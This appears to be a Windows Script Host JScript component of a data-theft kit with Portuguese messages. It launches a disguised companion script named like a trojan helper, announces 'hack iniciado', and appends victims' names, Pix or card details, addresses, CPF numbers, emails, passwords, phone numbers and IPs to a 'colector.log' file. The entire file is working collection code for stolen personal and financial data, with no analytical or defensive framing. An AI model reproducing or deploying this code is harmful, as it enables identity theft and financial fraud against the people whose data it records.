var cfe = new ActiveXObject("Scripting.FileSystemObject");
var shld = new ActiveXObject("WScript.Shell");
var MLC = cfe.GetParentFolderName(WScript.ScriptFullName);
var xhlprpopup = MLC + "\\windowdll.XHELPERTRJN.vbs";
var lock = MLC + "\\lock.tmp";

if (!cfe.FileExists(lock)) {
    cfe.CreateTextFile(lock);
    shld.Run('"' + xhlprpopup + '"');
}
if (WScript.Arguments.length < 7) {
    WScript.Echo("hack iniciado, se essa janela apareceu sem outra, apague o lock.tmp...");
    WScript.Quit();
}
var nome = WScript.Arguments(0);
var pix = WScript.Arguments(1);
var endereco = WScript.Arguments(2);
var cpf = WScript.Arguments(3);
var email = WScript.Arguments(4);
var senha = WScript.Arguments(5);
var num = WScript.Arguments(6);
var ip = WScript.Arguments(7);
var agora = new Date();
var clc = MLC + "\\colector.log"
var clcdll = cfe.OpenTextFile(clc, 8, true);

var linha =
    "[" + agora.toLocaleDateString() + " " + agora.toLocaleTimeString() + "]\r\n" +
    "Nome: " + nome + "\r\n" +
    "Pix/cartao: " + pix + "\r\n" +
    "Endereco: " + endereco + "\r\n" +
    "CPF: " + cpf + "\r\n" +
    "Email: " + email + "\r\n" +
    "Senha: " + senha + "\r\n" +
    "Número: " + num + "\r\n" +
    "IP: " + ip + "\r\n" +
    "----------------------------------------";
clcdll.WriteLine(linha);

